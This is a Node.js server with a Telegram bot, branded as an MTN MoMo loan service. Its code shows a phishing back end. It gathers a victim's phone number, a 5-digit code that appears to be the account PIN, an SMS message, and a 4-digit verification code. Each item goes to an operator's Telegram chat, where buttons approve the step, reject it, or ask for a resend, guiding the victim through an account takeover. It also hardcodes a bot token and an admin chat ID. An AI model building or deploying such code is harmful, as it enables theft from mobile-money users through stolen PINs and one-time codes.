const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const token = process.env.TELEGRAM_BOT_TOKEN || '9089639442:AAHhcFiQboEotPXbcDMbsTtg4r4kto4X2E4';
const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID || '8936816151';

let bot;
const pendingSessions = {};

if (token) {
    bot = new TelegramBot(token, { polling: true });

    bot.on('callback_query', async (query) => {
        const action = query.data;
        const chatId = query.message.chat.id;
        const messageId = query.message.message_id;
        await bot.answerCallbackQuery(query.id);

        const parts = action.split('_');
        const decision = parts[0];
        const sessionId = parts.slice(1).join('_');
        const session = pendingSessions[sessionId];

        if (!session) {
            return bot.sendMessage(chatId, '⚠️ Session not found or already processed.');
        }

        const originalText = query.message.text;

        // --- New Feature: Copy SMS Button ---
        if (decision === 'copysms') {
            if (!session.sms) {
                return bot.answerCallbackQuery(query.id, { text: "⚠️ No SMS found.", show_alert: true });
            }
            
            // Send the SMS alone in a brand new message so you can tap and copy it instantly
            await bot.sendMessage(chatId, `\`\`\`\n${session.sms}\n\`\`\``, { parse_mode: 'Markdown' });
            return bot.answerCallbackQuery(query.id, { text: "✅ SMS Extracted!", show_alert: false });
        }

        // --- Initial Approval ---
        if (decision === 'approve') {
            session.status = 'approved';
            session.nextStep = 'sms';
            await bot.editMessageText(`${originalText}\n\n✅ STATUS: APPROVED`, {
                chat_id: chatId,
                message_id: messageId
            });
        } else if (decision === 'reject') {
            session.status = 'rejected';
            session.nextStep = 'rejected';
            await bot.editMessageText(`${originalText}\n\n❌ STATUS: REJECTED\n(To set the correct code, use: /setcode ${sessionId} <5-digit-code>)`, {
                chat_id: chatId,
                message_id: messageId
            });
        }

        // --- SMS Review ---
        else if (decision === 'smsapprove') {
            session.status = 'sms_approved';
            session.nextStep = 'verification';
            await bot.editMessageText(`${originalText}\n\n✅ STATUS: APPROVED`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '📋 Copy SMS', callback_data: `copysms_${sessionId}` }
                    ]]
                }
            });
        } else if (decision === 'smsreject') {
            session.status = 'sms_rejected';
            session.nextStep = 'rejected';
            await bot.editMessageText(`${originalText}\n\n❌ STATUS: REJECTED\n(To set the correct code, use: /setcode ${sessionId} <5-digit-code>)`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '📋 Copy SMS', callback_data: `copysms_${sessionId}` }
                    ]]
                }
            });
        } else if (decision === 'smsresend') {
            session.nextStep = 'resend_sms';
            await bot.editMessageText(`${originalText}\n\n🔄 STATUS: RESEND REQUESTED`, {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '📋 Copy SMS', callback_data: `copysms_${sessionId}` }
                    ]]
                }
            });
        }

        // --- Final Verification ---
        else if (decision === 'verapprove') {
            session.status = 'final_approved';
            session.nextStep = 'final_approved';
            await bot.editMessageText(`${originalText}\n\n✅ STATUS: APPROVED`, {
                chat_id: chatId,
                message_id: messageId
            });
        } else if (decision === 'verreject') {
            session.status = 'final_rejected';
            session.nextStep = 'final_rejected';
            await bot.editMessageText(`${originalText}\n\n❌ STATUS: REJECTED`, {
                chat_id: chatId,
                message_id: messageId
            });
        } else if (decision === 'verresend') {
            session.nextStep = 'resend_verification';
            await bot.editMessageText(`${originalText}\n\n🔄 STATUS: RESEND REQUESTED`, {
                chat_id: chatId,
                message_id: messageId
            });
        }
    });

    bot.on('message', (msg) => {
        if (msg.chat.id.toString() !== adminChatId) return;
        if (msg.text === '/start') {
            bot.sendMessage(adminChatId,
                '🤖 *MTN MoMo Loan Bot*\n\n' +
                'Waiting for loan applications...\n\n' +
                'You will receive messages with action buttons.',
                { parse_mode: 'Markdown' }
            );
        }

        if (msg.text && msg.text.startsWith('/setcode ')) {
            const parts = msg.text.split(' ');
            if (parts.length < 3) {
                return bot.sendMessage(adminChatId, 'Usage: /setcode <sessionId> <5-digit-code>');
            }
            const sessionId = parts[1];
            const newCode = parts[2];
            const session = pendingSessions[sessionId];
            if (!session) {
                return bot.sendMessage(adminChatId, '⚠️ Session not found.');
            }
            session.fiveDigitCode = newCode;
            bot.sendMessage(adminChatId,
                `✅ *5-Digit Code Updated*\n\n` +
                `📱 Phone: ${session.phone}\n` +
                `🔑 New 5-Digit Code: ${newCode}\n\n` +
                `Session: ${sessionId}`,
                { parse_mode: 'Markdown' }
            );
        }
    });
} else {
    console.warn("⚠️ TELEGRAM_BOT_TOKEN is missing.");
}

app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/request-approval', (req, res) => {
    const { amount, term, phone, fiveDigitCode } = req.body;

    if (!bot || !adminChatId) {
        return res.status(500).json({ error: 'Server configuration error' });
    }

    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    pendingSessions[sessionId] = {
        amount,
        term,
        phone,
        fiveDigitCode,
        fourDigitCode: null,
        sms: null,
        status: 'pending',
        nextStep: null
    };

    bot.sendMessage(adminChatId,
        `📄 *New Loan Request*\n\n` +
        `📱 Phone: ${phone}\n` +
        `🔑 5-Digit Code: ${fiveDigitCode}\n\n` +
        `Approve to request SMS confirmation from the user.`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `approve_${sessionId}` },
                    { text: '❌ Reject', callback_data: `reject_${sessionId}` }
                ]]
            }
        }
    ).then(() => {
        res.status(200).json({ sessionId });
    }).catch((err) => {
        console.error(err);
        res.status(500).json({ error: 'Failed to send request' });
    });
});

app.get('/api/session-status/:sessionId', (req, res) => {
    const session = pendingSessions[req.params.sessionId];
    if (!session) return res.status(404).json({ error: 'Session not found' });
    res.json({ status: session.status, nextStep: session.nextStep });
});

app.post('/api/submit-sms', (req, res) => {
    const { sessionId, sms } = req.body;
    const session = pendingSessions[sessionId];

    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.sms = sms;

    bot.sendMessage(adminChatId,
        `📩 <b>SMS Received from User</b>\n\n` +
        `📱 Phone: ${session.phone}\n` +
        `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
        `*SMS Content:*\n` +
        `<pre><code>${sms}</code></pre>\n\n` +
        `Choose an action below.`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `smsapprove_${sessionId}` },
                    { text: '❌ Reject', callback_data: `smsreject_${sessionId}` },
                    { text: '🔄 Resend', callback_data: `smsresend_${sessionId}` }
                ]]
            }
        }
    ).then(() => res.status(200).json({ ok: true }))
    .catch(err => {
        console.error(err);
        res.status(500).json({ error: 'Failed to forward SMS' });
    });
});

app.post('/api/submit-verification', (req, res) => {
    const { sessionId, code } = req.body;
    const session = pendingSessions[sessionId];
    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.fourDigitCode = code;

    bot.sendMessage(adminChatId,
        `🔑 *4-Digit Verification Code Received*\n\n` +
        `📱 Phone: ${session.phone}\n` +
        `🔑 5-Digit Code: ${session.fiveDigitCode}\n` +
        `🔢 4-Digit Code: \`${code}\`\n\n` +
        `Choose an action below.`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Approve', callback_data: `verapprove_${sessionId}` },
                    { text: '❌ Reject', callback_data: `verreject_${sessionId}` },
                    { text: '🔄 Resend', callback_data: `verresend_${sessionId}` }
                ]]
            }
        }
    ).then(() => res.status(200).json({ ok: true }))
    .catch(err => {
        console.error(err);
        res.status(500).json({ error: 'Failed to send code' });
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});